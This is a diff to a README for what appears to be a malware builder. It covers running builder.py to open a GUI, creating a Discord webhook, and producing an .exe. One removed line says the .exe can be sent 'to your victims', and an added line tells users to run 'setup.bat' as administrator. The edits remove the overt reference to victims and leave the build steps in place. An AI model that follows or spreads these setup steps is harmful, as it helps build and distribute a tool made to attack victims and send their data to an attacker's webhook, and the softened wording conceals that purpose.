@@ -80,6 +80,7 @@ Once you've downloaded the files extract the folder so it's no longer a .zip fil
 ```
 You dont need to install any modules opening the install them for you.
 Then you can open the builder.py file which willopen the gui.
+You need to run "setup.bat" as administrator to avoid problems.
 ```
 ### 4. Create A Discord Webhook:
 
@@ -96,8 +97,7 @@ and anything you don't understand you can go to the documentation where each opt
 ### 6. What Now?
 
 ```
-The .exe file will appear in the same folder where all the other files are with the name you set it
-as and you can now send this to your victims.😈
+The .exe file will appear in the same folder where all the other files are with the name you set it as.
 ```
 ### 7. Disclaimer:
 ```
